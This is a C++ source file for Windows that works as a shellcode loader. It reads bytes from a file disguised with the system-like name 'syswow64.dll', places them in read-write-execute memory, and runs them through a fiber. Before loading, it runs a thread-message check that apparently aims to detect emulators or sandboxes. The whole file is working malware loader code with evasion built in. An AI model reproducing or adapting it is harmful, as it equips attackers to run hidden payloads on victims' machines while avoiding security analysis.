#include <Windows.h>
#include <fstream>
#include <vector>

#include "Native.h"

std::vector<BYTE> read(const char path[])
{
    std::ifstream file(path, std::ios::binary);
    std::vector<BYTE> data(std::istreambuf_iterator<char>(file), {});
    file.close();

    return data;
}

void inject()
{
    ConvertThreadToFiber(NULL);

    std::vector<BYTE> shellcode = read("syswow64.dll");

    PVOID ptr = VirtualAlloc(
        0,
        shellcode.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    memcpy(ptr, &shellcode[0], shellcode.size());

    PVOID fiber = CreateFiber(
        NULL,
        (LPFIBER_START_ROUTINE)ptr,
        NULL
    );
    SwitchToFiber(fiber);
}

void start()
{
    MSG msg;
    PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
    if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
        return;

    if (msg.message != WM_USER + 2 || msg.wParam != 23 || msg.lParam != 42)
        return;

    inject();
}